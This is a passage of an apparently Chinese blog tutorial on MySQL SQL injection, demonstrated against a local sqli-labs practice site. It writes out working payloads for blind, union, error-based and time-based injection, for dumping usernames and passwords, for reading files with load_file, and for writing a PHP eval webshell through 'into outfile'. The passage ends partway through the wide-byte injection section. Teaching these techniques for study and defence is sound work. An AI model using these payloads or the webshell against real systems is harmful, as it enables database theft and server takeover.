**目录**

[SQL注入的分类](#t0)

[判断是否存在SQL注入](#t1)

[一：Boolean盲注](#t2)

[二：union 注入](#t3)

[三：文件读写](#t4)

[四：报错注入](#t5)

[floor报错注入](#t6)

[ExtractValue报错注入](#t7)

[UpdateXml报错注入](#t8) 

[五：时间盲注](#t9)

[六：REGEXP正则匹配](#t10)

[七：宽字节注入](#t11)

[八：堆叠注入](#t12)

[九：二次注入](#t13)

[十：User-Agent注入](#t14)

[十一：Cookie注入](#t15)

[十二：过滤绕过](#t16)

[十三：传说中的万能密码](#t17) 

[SQL注入的预防](#t18)

[(1)预编译(PreparedStatement)(JSP)](#t19)

[(2)PDO(PHP)](#t20)

[(3)使用正则表达式过滤](#t21)

[(4) 其他](#t22)

* * *

> 以下所有代码的环境：MySQL5.5.20+PHP

**SQL注入**是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，前端传入后端的参数是攻击者可控的，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。

[SQL注入](https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020)可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤。SQL注入是针对数据库、后台、系统层面的攻击！

由于以下的环境都是MySQL数据库，所以先了解点MySQL有关的知识。

*   5.0以下是多用户单操作
*   5.0以上是多用户多操做

**在MySQL5.0以下，**没有information\_schema这个系统表，无法列表名等，只能暴力跑表名。

**在MySQL5.0以上**，MySQL中默认添加了一个名为 information\_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。

当尝试删除该数据库时，会爆出以下的错误！

![](https://img-blog.csdnimg.cn/20191222223103784.png)

**mysql中注释符**：

*   单行注释：#   
*   多行注释：/\*\*/  

![](https://img-blog.csdnimg.cn/20200229204512150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**information\_schema数据库中三个很重要的表：**

*   information\_schema.schemata:  该数据表存储了mysql数据库中的所有数据库的库名
*   information\_schema.tables：     该数据表存储了mysql数据库中的所有数据表的表名
*   information\_schema.columns:    该数据表存储了mysql数据库中的所有列的列名

关于这几个表的一些语法：

```
// 通过这条语句可以得到第一个的数据库名        
select schema_name from information_schema.schemata limit 0,1       
// 通过这条语句可以得到第一个的数据表名      
select table_name from information_schema.tables limit 0,1      
// 通过这条语句可以得到指定security数据库中的所有表名      
select table_name from information_schema.tables where table_schema='security'limit 0,1       
// 通过这条语句可以得到第一个的列名      1
select column_name from information_schema.columns limit 0,1      1
// 通过这条语句可以得到指定数据库security中的数据表users的所有列名      1
select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1       1
//通过这条语句可以得到指定数据表users中指定列password的第一条数据(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)      1
select password from users limit 0,1
```


**mysql中比较常用的一些函数**：

*   version()： 查询数据库的版本          
*   user()：查询数据库的使用者       
*   database()：数据库
*   system\_user()：系统用户名
*   session\_user()：连接数据库的用户名
*   current\_user：当前用户名
*   load\_file()：读取本地文件
*   @@datadir：读取数据库路径
*   @@basedir：mysql安装路径
*   @@version\_complie\_os：查看操作系统

> **ascii(str) :** 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii("a")=97

> **length(str) :** 返回给定字符串的长度，如  length("string")=6

> **substr(string,start,length) :** 对于给定字符串string，从start位开始截取，截取length长度 ,如  substr("chinese",3,2)="in"
> 
> 也可以 substr(string from start for length)
> 
> **substr()、stbstring()、mid()**  三个函数的用法、功能均一致

> **concat(username)：**将查询到的username连在一起，默认用逗号分隔
> 
> **concat(str1,'\*',str2)**：将字符串str1和str2的数据查询到一起，中间用\*连接
> 
> **group\_concat(username) ：**将username数据查询在一起，用逗号连接

> **limit 0,1**：查询第1个数       **limit 5**：查询前5个   **limit  1,1**： 查询第2个数             **limit  n,1**： 查询第n+1个数   
> 
> 也可以 limit  1 offset 0

更多的关于SQL语句：[常见的SQL语句](https://blog.csdn.net/qq_36119192/article/details/82875868 "常见的SQL语句") 

SQL注入的分类
========

**依据注入点类型分类**

*   数字类型的注入
*   字符串类型的注入
*   搜索型注入

**依据提交方式分类**

*   GET注入
*   POST注入
*   COOKIE注入
*   HTTP头注入(XFF注入、UA注入、REFERER注入）

**依据获取信息的方式分类**

*   基于布尔的盲注
*   基于时间的盲注
*   基于报错的注入
*   联合查询注入
*   堆查询注入 (可同时执行多条语句)

判断是否存在SQL注入
===========

一个网站有那么多的页面，那么我们如何判断其中是否存在SQL注入的页面呢？我们可以用网站漏洞扫描工具进行扫描，常见的网站漏洞扫描工具有 AWVS、AppScan、OWASP-ZAP、Nessus 等。

但是在很多时候，还是需要我们自己手动去判断是否存在SQL注入漏洞。下面列举常见的判断SQL注入的方式。但是目前大部分网站都对此有防御，真正发现网页存在SQL注入漏洞，还得靠技术和经验了。

**一：**二话不说，先加单引号'、双引号"、单括号）、双括号））等看看是否报错，如果报错就可能存在SQL注入漏洞了。

**二：**还有在URL后面加 and 1=1 、 and 1=2 看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。

**三：**还有就是Timing Attack测试，也就是时间盲注。有时候通过简单的条件语句比如 and 1=2 是无法看出异常的。

在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。

因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。

<table border="1" cellpadding="1" cellspacing="1" style="width:500px;"><tbody><tr><td>MySQL</td><td><p>benchmark(100000000,md(5))</p><p>sleep(3)</p></td></tr><tr><td>PostgreSQL</td><td><p>PG_sleep(5)</p><p>Generate_series(1,1000000)</p></td></tr><tr><td>SQLServer</td><td>waitfor delay&nbsp; '0:0:5'</td></tr></tbody></table>

**易出现SQL注入的功能点：**凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的 client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。

一：Boolean盲注
-----------

盲注，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的信息，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到了执行。

我们来看一个例子：这是sqli的Less-5，我自己对源码稍微改动了一下，使得页面会显示执行的sql语句

通过输入 [http://127.0.0.1/sqli/Less-1/?id=1](http://127.0.0.1/sqli/Less-1/?id=1%27 "http://127.0.0.1/sqli/Less-1/?id=1   ")   我们得到了下面的页面

![](https://img-blog.csdn.net/20180902191155380?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

然后输入 [http://127.0.0.1/sqli/Less-5/?id=-1](http://127.0.0.1/sqli/Less-5/?id=-1 "http://127.0.0.1/sqli/Less-5/?id=-1")   我们得到下面的页面

![](https://img-blog.csdn.net/20180902210155815?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

当我们输入  [http://127.0.0.1/sqli/Less-5/?id=1](http://127.0.0.1/sqli/Less-5/?id=1%27 "http://127.0.0.1/sqli/Less-5/?id=1")'  我们得到下面的页面

![](https://img-blog.csdnimg.cn/20181203195250882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

由此可以看出代码把 id 当成了字符来处理，而且后面还有一个限制显示的行数  limit 0,1 。当我们输入的语句正确时，就显示You are in....   当我们输入的语句错误时，就不显示任何数据。当我们的语句有语法错误时，就报出 SQL 语句错误。

于是，我们可以推断出页面的源代码：

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //sql查询语句      
$result=mysql_query($sql);      
$row = mysql_fetch_array($result);      
	if($row){                    //如果查询到数据      
      	  echo 'You are in...........';      
  	}else{                      //如果没查询到数据      
	     print_r(mysql_error());  	      
	}
```


于是我们可以通过构造一些判断语句，通过页面是否显示来证实我们的猜想。盲注一般用到的一些函数：**ascii()** 、**substr()** 、**length()，exists()、concat()等**

1：判断数据库类型

![](https://img-blog.csdnimg.cn/20200102111000833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这个例子中出错页面已经告诉了我们此数据库是MySQL，那么当我们不知道是啥数据库的时候，如何分辨是哪个数据库呢？

虽然绝大多数数据库的大部分SQL语句都类似，但是每个数据库还是有自己特殊的表的。通过表我们可以分辨是哪些数据库。

MySQL数据库的特有的表是 **information\_schema.tables**  , access数据库特有的表是 **msysobjects** 、SQLServer 数据库特有的表是 **sysobjects** ,oracle数据库特有的表是 **dual**。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库

```
//判断是否是 Mysql数据库      
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from information_schema.tables) #       
//判断是否是 access数据库      
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from msysobjects) #       
//判断是否是 Sqlserver数据库      
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from sysobjects) #       1
//判断是否是Oracle数据库      1
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(*) from dual)>0 #
```


对于MySQL数据库，information\_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。

**information\_schema.tables** 存储了数据表的元数据信息，下面对常用的字段进行介绍：

*   table\_schema: 记录**数据库名**；
*   table\_name: 记录**数据表名**；
*   table\_rows: 关于表的粗略行估计；
*   data\_length : 记录**表的大小**（单位字节）；

2：判断当前数据库名(以下方法不适用于access和SQL Server数据库)

```
1：判断当前数据库的长度，利用二分法      
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>5   //正常显示      
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>10   //不显示任何数据      
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>7   //正常显示      
http://127.0.0.1/sqli/Less-5/?id=1' and length(database())>8   //不显示任何数据       
大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为 8       
2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断      1
//判断数据库的第一个字符      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),1,1))>100       1
//判断数据库的第二个字符      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),2,1))>100       1
...........      1
由此可以判断出当前数据库为 security
```


3：判断当前数据库中的表

```
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select*from admin)   //猜测当前数据库中是否存在admin表      
1：判断当前数据库中表的个数      
// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4      
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>5 #       
2：判断每个表的长度      
//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6      
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6       1
//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6      1
http://127.0.0.1/sqli/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6       1
3：判断每个表的每个字符的ascii值      1
//判断第一个表的第一个字符的ascii值      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #       1
//判断第一个表的第二个字符的ascii值      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>100 #       2
.........      2
由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断
```


4. 判断表中的字段

```
http://127.0.0.1/sqli/Less-5/?id=1' and exists(select username from admin)   //如果已经证实了存在admin表，那么猜测是否存在username字段      
1：判断表中字段的个数      
//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的      
http://127.0.0.1/sqli/Less-5/?id=1' and (select count(column_name) from information_schema.columns where table_name='users')>5 #       
2：判断字段的长度      
//判断第一个字段的长度      
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5       1
//判断第二个字段的长度      1
http://127.0.0.1/sqli/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))>5       1
3：判断字段的ascii值      1
//判断第一个字段的第一个字符的长度      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100       1
//判断第一个字段的第二个字符的长度      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))>100       2
...........      2
由此可判断出users表中存在 id、username、password 字段
```


5.判断字段中的数据

```
我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据       
1: 判断数据的长度      
// 判断id字段的第一个数据的长度      
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 0,1))>5       
// 判断id字段的第二个数据的长度      
http://127.0.0.1/sqli/Less-5/?id=1' and length((select id from users limit 1,1))>5       1
2：判断数据的ascii值      1
// 判断id字段的第一个数据的第一个字符的ascii值      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),1,1))>100       1
// 判断id字段的第一个数据的第二个字符的ascii值      1
http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr((select id from users limit 0,1),2,1))>100       1
...........
```


二：union 注入
----------

[union](https://so.csdn.net/so/search?q=union&spm=1001.2101.3001.7020)联合查询适用于有显示列的注入。

我们可以通过order by来判断当前表的列数。最后可得知，当前表有3列

[http://127.0.0.1/sqli/Less-1/?id=1' order by 3 #](http://127.0.0.1/sqli/Less-1/?id=1'%20rel= "http://127.0.0.1/sqli/Less-1/?id=1' order by 3 #")

我们可以通过 union 联合查询来知道显示的列数

[127.0.0.1/sqli/Less-1/?id=1' union select 1 ,2 ,3 #](http://127.0.0.1/sqli/Less-1/?id=1'%20rel= "127.0.0.1/sqli/Less-1/?id=1' union select 1 ,2 ,3 #")

![](https://img-blog.csdn.net/20180823213715280?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

咦，这里为啥不显示我们联合查询的呢？因为这个页面只显示一行数据，所以我们可以用 and 1=2 把前面的条件给否定了，或者我们直接把前面 id=1 改成 id =-1 ,在后面的代码中，都是将 id=-1进行注入

```
http://127.0.0.1/sqli/Less-1/?id=1' and 1=2 union select 1,2,3 #       
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,3 #
```


![](https://img-blog.csdn.net/20180825121820169?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

这样，我们联合查询的就显示出来了。可知，第2列和第3列是显示列。那我们就可以在这两个位置插入一些函数了。

我们可以通过这些函数获得该数据库的一些重要的信息

*   version() ：数据库的版本    
*   database() :当前所在的数据库   
*   @@basedir :  数据库的安装目录
*   @@datadir ： 数据库文件的存放目录    
*   user() ： 数据库的用户  
*   current\_user() : 当前用户名
*   system\_user() : 系统用户名    
*   session\_user() :连接到数据库的用户名

```
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,version(),user() #
```


![](https://img-blog.csdn.net/20180825121849152?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

```
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,database(),@@basedir #
```


![](https://img-blog.csdn.net/20180825121952187?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

```
http://127.0.0.1/sqli/Less-1/?id=-1'   union select 1,@@datadir,current_user() #
```


![](https://img-blog.csdn.net/20180825122028800?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们还可以通过union注入获得更多的信息。

```
// 获得所有的数据库       
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(schema_name),3 from information_schema.schemata#       
// 获得所有的表      
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(table_name),3 from information_schema.tables#       
// 获得所有的列      
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(column_name),3 from information_schema.columns#       1
#获取当前数据库中指定表的指定字段的值(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)      1
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(password),3 from users%23
```


![](https://img-blog.csdnimg.cn/20181203200336271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70) 当我们已知当前数据库名security，我们就可以通过下面的语句得到当前数据库的所有的表

```
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' #
```


![](https://img-blog.csdnimg.cn/20181203200148384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道每一个表中的列

```
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' #
```


如下，我们可以知道users表中有id，username，password三列

![](https://img-blog.csdnimg.cn/20181203201654448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们知道存在users表，又知道表中有 id ，username， password三列，那么我们可以构造如下语句

```
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,group_concat(id,'--',username,'--',password),3 from users #
```


我们就把users表中的所有数据都给爆出来了

![](https://img-blog.csdnimg.cn/20181203201813924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

三：文件读写
------

*   当有显示列的时候，文件读可以利用 union 注入。
*   当没有显示列的时候，只能利用盲注进行数据读取。

示例：读取e盘下3.txt文件

union注入读取文件(load\_file)

```
//union注入读取 e:/3.txt 文件      
http://127.0.0.1/sqli/Less-1/?id=-1'   union select 1,2,load_file("e:/3.txt")#       
//也可以把 e:/3.txt 转换成16进制 0x653a2f332e747874      
http://127.0.0.1/sqli/Less-1/?id=-1'   union select 1,2,load_file(0x653a2f332e747874)#
```


![](https://img-blog.csdnimg.cn/20181203202108410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70) ![](https://img-blog.csdnimg.cn/20181203202213731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

盲注读取文件

```
//盲注读取的话就是利用hex函数，将读取的字符串转换成16进制，再利用ascii函数，转换成ascii码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成      
http://127.0.0.1/sqli/Less-1/?id=-1' and ascii(mid((select hex(load_file('e:/3.txt'))),18,1))>49#' LIMIT 0,1
```


我们可以利用写入文件的功能，在e盘创建4.php文件，然后写入一句话木马

union写入文件(into outfile)

```
//利用union注入写入一句话木马  into outfile 和 into dumpfile 都可以      
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,2,'<?php @eval($_POST[aaa]);?>'  into outfile  'e:/4.php' #       
// 可以将一句话木马转换成16进制的形式      
http://127.0.0.1/sqli/Less-1/?id=-1'  union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e  into outfile  'e:/4.php' #
```


四：报错注入
------

**利用前提**: 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql\_error()  
**优点**: 不需要显示位  
**缺点**: 需要输出 mysql\_error( )的报错信息

### floor报错注入

floor报错注入是利用 **count()函数** 、**rand()函数** 、**floor()函数** 、**group by** 这几个特定的函数结合在一起产生的注入漏洞。缺一不可

```
// 我们可以将 user() 改成任何函数，以获取我们想要的信息。具体可以看文章开头关于information_schema数据库的部分      
http://127.0.0.1/sqli/Less-1/?id=-1'  and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a) #       
//将其分解      
(select 1 from (Y)a)       
Y= select count(*) from information_schema.tables group by concat(Z)       
Z= user(),floor(rand(0)*2)           //将这里的 user() 替换成我们需要查询的函数
```


![](https://img-blog.csdnimg.cn/20181203203203736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

floor报错注入参考：[floor()报错注入\_超人学飞的日子-CSDN博客\_floor报错注入](https://blog.csdn.net/zpy1998zpy/article/details/80650540 "floor()报错注入_超人学飞的日子-CSDN博客_floor报错注入")

### ExtractValue报错注入

> EXTRACTVALUE (XML\_document, XPath\_string)

*   第一个参数：XML\_document 是 String 格式，为 XML 文档对象的名称
*   第二个参数：XPath\_string (Xpath 格式的字符串).

作用：从目标 [XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020) 中返回包含所查询值的字符串

ps: 返回结果 限制在32位字符

```
// 可以将 user() 改成任何我们想要查询的函数和sql语句 ,0x7e表示的是 ~      
http://127.0.0.1/sqli/Less-1/?id=-1'  and extractvalue(1,concat(0x7e,user(),0x7e))#       
// 通过这条语句可以得到所有的数据库名，更多的关于informaion_schema的使用看文章头部      
http://127.0.0.1/sqli/Less-1/?id=-1'  and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e))#
```


![](https://img-blog.csdnimg.cn/20181203203331591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### UpdateXml报错注入 

UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码！

> UPDATEXML (XML\_document, XPath\_string, new\_value)

*   第一个参数：XML\_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1
*   第二个参数：XPath\_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。
*   第三个参数：new\_value，String 格式，替换查找到的符合条件的数据

作用：改变文档中符合条件的节点的值

```
// 可以将 user() 改成任何我们想要查询的函数和sql语句 ,0x7e表示的是 ~      
http://127.0.0.1/sqli/Less-1/?id=-1'  and updatexml(1,concat(0x7e,user(),0x7e),1)#       
// 通过这条语句可以得到所有的数据库名，更多的关于informaion_schema的使用看文章头部      
http://127.0.0.1/sqli/Less-1/?id=-1'  and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)#
```


![](https://img-blog.csdnimg.cn/20181203223651972.png) 
-------------------------------------------------------

更多的关于报错注入的文章：[SQL注入的报错注入函数\_cyjmosthandsome的博客-CSDN博客\_sql注入报错注入](https://blog.csdn.net/cyjmosthandsome/article/details/87947136 "SQL注入的报错注入函数_cyjmosthandsome的博客-CSDN博客_sql注入报错注入")

                                               [sql注入报错注入原理解析\_一个安全研究员-CSDN博客\_报错注入原理](https://blog.csdn.net/he_and/article/details/80455884 "sql注入报错注入原理解析_一个安全研究员-CSDN博客_报错注入原理")

五：时间盲注
------

Timing Attack注入，也就是时间盲注。通过简单的条件语句比如 and 1=2 是无法看出异常的。

在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。

因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。

<table border="1" cellpadding="1" cellspacing="1" style="width:500px;"><tbody><tr><td>MySQL</td><td><p>benchmark(100000000,md5(1))</p><p>sleep(3)</p></td></tr><tr><td>PostgreSQL</td><td><p>PG_sleep(5)</p><p>Generate_series(1,1000000)</p></td></tr><tr><td>SQLServer</td><td>waitfor delay&nbsp; '0:0:5'</td></tr></tbody></table>

**利用前提：**页面上没有显示位，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep(5)条件之后，页面的返回速度明显慢了 5 秒。  
**优点：**不需要显示位，不需要出错信息。  
**缺点：**速度慢，耗费大量时间

sleep 函数判断页面响应时间               if(判断条件，为true时执行，为false时执行)

我们可以构造下面的语句，判断条件是否成立。然后不断变换函数直到获取到我们想要的信息

```
//判断是否存在延时注入      
http://127.0.0.1/sqli/Less-1/?id=1' and sleep(5)#       
// 判断数据库的第一个字符的ascii值是否大于100，如果大于100，页面立即响应，如果不大于，页面延时5秒响应      
http://127.0.0.1/sqli/Less-1/?id=1' and if(ascii(substring(database(),1,1))<100,1,sleep(5)) #
```


六：REGEXP正则匹配
------------

正则表达式，又称规则表达式（Regular Expression，在代码中常简写为[regex](https://so.csdn.net/so/search?q=regex&spm=1001.2101.3001.7020)、regexp或RE），计算机科学的一个概念。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本

![](https://img-blog.csdn.net/20180823231241895?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

查找name字段中含有a或者b的所有数据：        select name from admin where name regexp ' a|b ';  
查找name字段中含有ab，且ab前有字符的所有数据(.匹配任意字符)： select name from admin where name regexp ' .ab ';  
查找name字段中含有at或bt或ct的所有数据：   select name from admin where name regexp ' \[abc\]t ';  
查找name字段中以a-z开头的所有数据：          select name from admin where name regexp ' ^\[a-z\] ';

已知数据库名为 security，判断第一个表的表名是否以 a-z 中的字符开头，^\[a-z\]  -->  ^a ; 判断出了第一个表的第一个字符，接着判断第一个表的第二个字符 ^a\[a-z\] -->  ^ad ;  就这样，一步一步判断第一个表的表名  ^admin$ 。然后 limit 1，1 判断第二个表

```
// 判断security数据库下的第一个表的是否以a-z的字母开头      
http://127.0.0.1/sqli/Less-1/?id=1' and  1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^[a-z]' limit 0,1) #
```


参考文档：[\[转载\]sql 盲注之正则表达式攻击 - lcamry - 博客园](http://www.cnblogs.com/lcamry/articles/5717442.html "[转载]sql 盲注之正则表达式攻击 - lcamry - 博客园")

七：宽字节注入
-------

宽字节注入是由于不同编码中中英文所占字符的不同所导致的。通常来说，在GBK编码当中，一个汉字占用2个字节。而在UTF-8编码中，一个汉字占用3个字节。在php中，我们可以通过输入 echo strlen("中") 来测试，当为GBK编码时，输入2，而为UTF-8编码时，输出3。除了GBK以外，所有的ANSI编码都是中文都是占用两个字节。

相关文章：[字符集与字符编码](https://blog.csdn.net/qq_36119192/article/details/84138312 "字符集与字符编码")

在说之前，我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。

**addslashes()** ：这个函数在预定义字符之前添加反斜杠 \\ 。预定义字符：  单引号 ' 、双引号 " 、反斜杠 \\ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \\ 进行转义，但是 \\ 并不会插入到数据库中。这个函数的功能和魔术引号完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用 get\_magic\_quotes\_gpc() 来检测是否已经转义。

**mysql\_real\_escape\_string()** ：这个函数用来转义sql语句中的特殊符号x00 、\\n  、\\r  、\\  、‘  、“ 、x1a。

